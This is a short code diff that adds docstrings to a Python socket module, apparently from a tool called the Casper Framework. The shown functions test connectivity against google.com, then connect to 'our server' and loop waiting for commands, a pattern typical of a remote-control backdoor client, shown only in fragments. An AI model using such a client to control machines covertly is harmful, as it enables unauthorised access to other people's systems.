@@ -4,6 +4,9 @@ Part of Casper Framework
 from includes import *
 
 def socket_create():
+	"""
+	create a socket
+	"""
 	global socket_server
 
 	try:
@@ -13,6 +16,10 @@ def socket_create():
 		logging.debug("[casper] Unable to setup socket > {}".format(e))
 
 def socket_test():
+	"""
+	test our connection against google server to make sure
+	we can use socket to connect with
+	"""
 	test_host = "google.com"
 	test_port = 80
 
@@ -27,6 +34,9 @@ def socket_test():
 		socket_server.close()
 
 def socket_control(host,port,buffer):
+	"""
+	connect to our server and wait for commands
+	"""
 	if (socket_test() == True):
 		while True:
 			if (socket_create() == True):
